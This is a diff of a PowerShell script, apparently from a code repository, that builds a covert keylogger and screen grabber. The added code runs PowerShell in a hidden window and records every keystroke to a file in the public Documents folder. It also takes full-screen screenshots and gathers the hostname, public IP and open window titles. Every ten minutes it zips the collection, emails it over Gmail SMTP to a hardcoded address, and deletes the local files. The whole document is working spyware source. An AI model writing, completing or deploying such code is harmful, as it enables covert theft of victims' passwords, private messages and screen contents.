@@ -1,45 +1,59 @@
 
+ ##opens this powershell script in a closed windows even though there is a small pop up at the start
+PowerShell.exe -NonInteractive -Nologo -Noprofile -windowstyle hidden   {
+
   $x = 0
+ 
 
-  $allfiles = @()
-
+##Get the library from a .NET type to use the [System.Windows.Input.Keyboard] so that i can detect the keystrokes and take the screenshots 
  Add-Type -AssemblyName WindowsBase
  Add-Type -AssemblyName PresentationCore
+ Add-Type -AssemblyName System.Windows.Forms
+ Add-type -AssemblyName System.Drawing
+ ##################################################################################################
 
-New-Item -Path "C:\Users\Public\Documents\Screen\test.txt" -ItemType File -Force
-$array = @("a","b","c","d","e","f","g","h","i","J","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","space","Enter","1","2","3","4","5","6","7","8","9","Oem5","Capital","backspace","Oem1 ", "OemSemicolon", "OemPlus", "OemComma", "OemMinus", "OemPeriod", "Oem2", "OemQuestion", "Oem3", "OemTilde", "AbntC1", "AbntC2", "Oem4", "OemOpenBrackets", "Oem5", "OemPipe", "Oem6", "OemCloseBrackets", "Oem7", "OemQuotes", "Oem8", "Oem102", "OemBackslash")
-  $allfiles += "C:\Users\Public\Documents\Screen\test.txt"
+ ##Create a file to store the screenshots and the text file with the keytrokes##
 
+New-Item -Path "C:\Users\Public\Documents\Screen\test.txt" -ItemType File -Force 
+
+
+ 
+##Create an array that stores all the possible keys####
+$array = @("a","b","c","d","e","f","g","h","i","J","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","space","Enter","1","2","3","4","5","6","7","8","9","Oem5","Capital","backspace","Oem1 ", "OemSemicolon", "OemPlus", "OemComma", "OemMinus", "OemPeriod", "Oem2", "OemQuestion", "Oem3", "OemTilde", "AbntC1", "AbntC2", "Oem4", "OemOpenBrackets", "Oem5", "OemPipe", "Oem6", "OemCloseBrackets", "Oem7", "OemQuotes", "Oem8", "Oem102", "OemBackslash","ctrl")
+
+ ##################################################################################################
 
     while ($true){
 
-#####loop trought the array
+#####loop trought the array of letters until one letter is pressed######
 foreach($letter in $array){
-$date = (Get-Date).Second
-$key = [System.Windows.Input.Keyboard]::IsKeyUp("$letter")   
+
+$date = Get-Date -Format mm:ss  ###Get the time in seconds so that the the files can be sent to the email later
+
+$key = [System.Windows.Input.Keyboard]::IsKeyUp("$letter") ##detect the keystrokes
 
 if ($key -eq $false){
-    Write-Host "$letter" -NoNewline 
-     "°$letter°" | Out-File -Append -FilePath "C:\Users\Public\Documents\Screen\test.txt" -NoNewline 
+    Write-Host "$letter" -NoNewline #Key has been pressed 
+
+     "°$letter°" | Out-File -Append -FilePath "C:\Users\Public\Documents\Screen\test.txt" -NoNewline #send the letter that has been pressed to the file with the °Example° so that later we can remove them
+##################################################################################################
      
- ###################Screenshot part###########
-if ($letter -eq "Enter" -or $letter -eq "Space" -or $letter -eq "backspace"){
+ ###################Screenshot part#############################################################################################################
+if ($letter -eq "Enter" -or $letter -eq "Space" -or $letter -eq "backspace"){ #if the pressed is equal to Enter;space;or backspace we will take a screenshot
+
     $File = "C:\Users\Public\Documents\Screen\Screenshot$x.bmp"
-   
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-type -AssemblyName System.Drawing
     $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
     $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
     $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
     $graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
     $bitmap.Save($File)
-    $allfiles += "C:\Users\Public\Documents\Screen\Screenshot$x.bmp"
+    
     $x = $x + 1
 }
-
+ ####################################################################################################################################################################################################
 
   
-while($key -eq $false){
+while($key -eq $false){ ##Dont do anything if the key hasn´t been pressed
     
     $key = [System.Windows.Input.Keyboard]::IsKeyUp("$letter")
 
@@ -48,32 +62,49 @@ while($key -eq $false){
 
 
 }
-if ($date -eq 59){
-(Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "Enter" ,"`n" | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt
-(Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "backspace" ,"`b" | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt
+#### if the time is equal to 10m,or 20 or 30 or 40 or 50 minutes, we will remove all the °° that we added before to the letters so that we dont have problems like if the user types in : Enter it will write °E°°n°°t°°e°°r° instead of Enter and get deleted 
+if ($date -eq "00:00" -or $date -eq "10:00" -or $date -eq "20:00" -or $date -eq "30:00" -or $date -eq "40:00"-or $date -eq "50:00"){ 
+(Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "Enter" ,"`n" | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt ##trasnform the word Enter into a space down
+(Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "°backspace°" ,"DELETE" | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt
 (Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "space" ," " | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt
-(Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "°" ,"" | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt
-
- $allfiles += "C:\Users\Public\Documents\Screen\test.txt"
-
-$EmailFrom = "Enter your E-mail here                
-$EmailTo = "Enter your the email of the person reciving the files"
+(Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "Capital" ,"|" | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt ##trasnform the word Capital into | si that it occupies less space
+(Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "°" ,"" | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt ##trasnform the word for example:  °E°°n°°t°°e°°r° into Enter
+ #############################Get public ip of the computer#####################################################################
+  $PublicIp = (Invoke-WebRequest -uri "https://api.ipify.org/").Content
+  ############################Get information about windows that are open#
+  $Windowsopen = Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | Select-Object MainWindowTitle
+Add-Content -Path C:\Users\Public\Documents\Screen\test.txt -Value "This is the Hostname : $env:computername"   ##Get the na,e of the computer and output to the notepad
+Add-Content -Path C:\Users\Public\Documents\Screen\test.txt -Value "This is the Public IP : $PublicIp"  ##Get the public ip of the User and output to the notepad
+Add-Content -Path C:\Users\Public\Documents\Screen\test.txt -Value  "This were the open windows : "   ##Get windows that were open
+Add-Content -Path C:\Users\Public\Documents\Screen\test.txt -Value  $Windowsopen   ##Get windows that were open
+Compress-Archive -Path "C:\Users\Public\Documents\Screen" -DestinationPath "C:\Users\Public\Documents\Screen" -Force 
+$allfiles += "C:\Users\Public\Documents\Screen.zip"
+echo "these are all files $allfiles"
+ #############################################Send an email with the screenshots and Text file#######################################################################################################################################################
+$EmailFrom = "098itauscript098@gmail.com"                
+$EmailTo = "098itauscript098@gmail.com"
             
 $EmailSubject = "Powershell" 
-$EmailBody = "Files and Downlads made today" 
+$EmailBody = "Screenshots and text" 
 
 $SMTPserver= "smtp.gmail.com"
-$username="Enter your E-mail here" 
-$password = "Enter you password here" | ConvertTo-SecureString -AsPlainText -Force
+$username="YOUR EMAIL HERE" 
+$password = "YOUR PASSWORD HERE" | ConvertTo-SecureString -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential($username, $password)
 
-Send-MailMessage -ErrorAction Stop -from "$EmailFrom" -to "$EmailTo" -subject "$EmailSubject" -body "$EmailBody" -SmtpServer "$SMTPserver"  -Priority  "Normal" -Credential $credential -Port 587 -UseSsl -Attachments $allfiles
-  New-Item -Path "C:\Users\Public\Documents\Screen\test.txt" -ItemType File -Force
-  $allfiles = @()
+Send-MailMessage -ErrorAction Continue -from "$EmailFrom" -to "$EmailTo" -subject "$EmailSubject" -body "$EmailBody" -SmtpServer "$SMTPserver"  -Priority  "Normal" -Credential $credential -Port 587 -UseSsl -Attachments $allfiles 
+  ## this will remove all folders and create them again 
+  Remove-Item -Path "C:\Users\Public\Documents\Screen" -Force -Recurse
+  Remove-Item -Path "C:\Users\Public\Documents\Screen.zip" -Force -Recurse
+  New-Item -Path "C:\Users\Public\Documents\Screen" -ItemType Directory -Force
+  New-Item -Path "C:\Users\Public\Documents\Screen\test.txt" -ItemType File -Force  
+   $allfiles = @()
 }
 
 
 }
 }
 
+
+}
 
